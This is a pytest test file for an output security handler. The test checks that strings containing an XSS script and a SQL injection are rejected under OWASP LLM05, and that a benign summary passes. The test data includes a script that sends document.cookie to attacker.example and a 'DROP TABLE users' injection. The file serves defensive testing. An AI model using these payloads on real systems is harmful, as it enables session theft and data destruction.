import pytest
from src.exceptions import OutputPolicyViolationError
from src.targets.output_handler import OutputSecurityHandler


def test_llm05_output_guard_blocks_xss_and_sqli() -> None:
    handler = OutputSecurityHandler()

    with pytest.raises(OutputPolicyViolationError, match="LLM05") as xss_exc:
        handler.validate_downstream_payload(
            "Report ready: <script>fetch('https://attacker.example' + document.cookie)</script>"
        )
    assert xss_exc.value.owasp_id == "LLM05"
    assert xss_exc.value.http_status == 422

    with pytest.raises(OutputPolicyViolationError, match="LLM05") as sqli_exc:
        handler.validate_downstream_payload("Query result: 1; DROP TABLE users; --")
    assert sqli_exc.value.owasp_id == "LLM05"
    assert sqli_exc.value.http_status == 422

    safe_html = handler.validate_downstream_payload("Quarterly audit summary: 0 critical findings.")
    assert "Quarterly audit summary" in safe_html